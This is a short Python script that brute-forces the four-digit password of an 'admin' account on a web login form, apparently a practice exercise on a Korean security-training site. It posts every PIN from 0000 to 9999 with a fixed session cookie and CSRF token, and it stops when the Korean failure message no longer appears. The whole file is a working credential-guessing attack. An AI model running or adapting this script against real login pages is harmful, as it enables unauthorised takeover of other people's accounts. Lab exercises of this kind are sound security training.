import requests

url = "https://elms2.skinfosec.co.kr:8110/practice/practice02/login"

headers ={
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies ={
    "JSESSIONID":"5935C7C13A69383D15762ADB6F64EDE4"
}

data = {
    "_csrf": "81bfffb4-caa5-43dd-9fe5-4c03fee3f141",  # CSRF 토큰 값
    "memberid": "admin",  # 여기에 실제 아이디 입력
    "password": "1234",  # 여기에 실제 패스워드 입력
}

for i in range(0000,10000):
    pw = str(i).zfill(4)
    data["password"] = pw
    response = requests.post(url, data=data, headers=headers, cookies=cookies)
    if "로그인에 실패" in response.text:
        print(f"비밀번호 [{pw}] 아님...")
    else:
        print(f"비밀번호는 [{pw}]였다!!!")
        break